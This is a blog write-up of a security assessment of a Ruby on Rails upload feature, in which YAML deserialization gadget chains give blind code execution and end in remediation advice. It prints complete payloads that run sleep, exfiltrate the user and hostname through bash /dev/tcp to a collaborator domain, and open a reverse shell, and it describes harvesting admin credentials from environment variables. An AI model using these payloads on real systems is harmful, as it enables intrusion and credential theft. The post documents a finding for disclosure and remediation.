---
title:  "Blind Remote Code Execution through YAML Deserialization"
layout: post
date:   2021-06-09
---

During an application security assessment of a Ruby on Rails project, I identified upload functionality that allowed users to submit text, CSV, and YAML files. The YAML option stood out due to its potential as a deserialization vulnerability.  

After several uploads, I found that the process validated file contents before uploading them to Azure blob storage. YAML files starting with **&#45;&#45;&#45;!ruby/object:BadValue** triggered a fatal status, while other invalid YAML files returned an error status. This fatal status was the only indicator that the upload process might be vulnerable.

<figure>
  <img src="/assets/images/2021/blind-rce-status-indicator.png">
  <figcaption>Figure 1 – Fatal status on poc2.yml</figcaption>
</figure>  

Several researchers previously identified gadget chains in Ruby that could lead to code execution, as detailed in the GitHub Gist ["Ruby YAML Exploits."](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml)

I first tested the Gem::Requirement chain using nslookup and curl commands to a Burp collaborator but received no DNS lookup. After this chain failed, I tested the Gem::Installer chain with the same commands, but again no DNS lookup occurred.

After several attempts, I decided to try the sleep command for 10 minutes with the Gem::Installer chain.
{% highlight yaml %}
---
- !ruby/object:Gem::Installer
     i: x
- !ruby/object:Gem::SpecFetcher
     i: y
- !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: sleep 600
          method_id: :resolve
{% endhighlight %}

Uploading the YAML file caused the status icon to display a loading animation for 10 minutes, indicating that the sleep command executed successfully.

<figure>
  <img src="/assets/images/2021/yaml-deserial-rce-sleep-1.png">
  <figcaption>Figure 2 – Start of the upload</figcaption>
</figure>

<figure>
  <img src="/assets/images/2021/yaml-deserial-rce-sleep-2.png">
  <figcaption>Figure 3 – Nine minutes after the file was uploaded</figcaption>
</figure> 

After many failed attempts, I finally achieved success! While the sleep command doesn't demonstrate significant impact, it confirmed that code execution was possible. Although it could be used for data exfiltration through a Bash if condition (see below), this would be time-consuming and tedious.
{% highlight bash %}
if [ -f /etc/passwd ]; then sleep 5; fi
{% endhighlight %}

After further consideration, I tried the bash -c command, echoing to **/dev/tcp/:remote-server/443**, hoping for a DNS lookup. To my surprise, I received a DNS lookup and was able to exfiltrate the user and server hostname.

{% highlight yaml %}
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -c 'echo 1 > /dev/tcp/`whoami`.`hostname`.wkkib01k9lsnq9qm2pogo10tmksagz.burpcollaborator.net/443'"
         method_id: :resolve
{% endhighlight %}

<figure>
  <img src="/assets/images/2021/yaml-rce.png">
  <figcaption>Figure 4 – Exfiltrated user and server hostname through DNS lookup</figcaption>
</figure> 

Upon reviewing the server hostnames, I noticed they changed each time the same file was re-uploaded. It seemed there wasn’t much impact, as an Azure Serverless function or worker was likely being spun up. To assess potential impact, I needed to confirm access to environment variables for sensitive information.

I then decided to attempt a reverse shell on port 443, as it’s less likely to be filtered outbound, using the following YAML file.

{% highlight yaml %}
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -c 'bash -i >& /dev/tcp/reverseshell.example.com/443 0>&1'"
         method_id: :resolve
{% endhighlight %}

Success! I gained a reverse shell and ran printenv, which revealed sensitive information, including Keycloak admin credentials, Redis, and Azure DB details.

<figure>
  <img src="/assets/images/2021/reverse-shell-env-vars.png">
  <figcaption>Figure 5 – Listed server environment variables</figcaption>
</figure> 

The server was not an Azure function, but a Kubernetes pod, likely running on Azure Kubernetes. Using the Keycloak admin credentials, I logged into Keycloak's master realm as the admin user through the following URL:  
**https://redacted.com/auth/realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=https%3A%2F%2Fredacted.com%2Fauth%2Frealms%2Fmaster%2Faccount%2F&state=:stateUUID&response_mode=fragment&response_type=code&scope=openid&nonce=:nonceUUID&code_challenge=:challengeValue&code_challenge_method=S256**

The state UUID, nonce UUID, and code challenge values were obtained from the web application's realm.

Given the high impact, the report was sent immediately, with remediation suggesting replacing Ruby's YAML.load() with YAML.safe_load(), as YAML.load() was likely the cause of the vulnerability.

References:  
https://ruby-doc.org/stdlib-2.6.1/libdoc/psych/rdoc/Psych.html  
https://www.elttam.com/blog/ruby-deserialization/  
https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
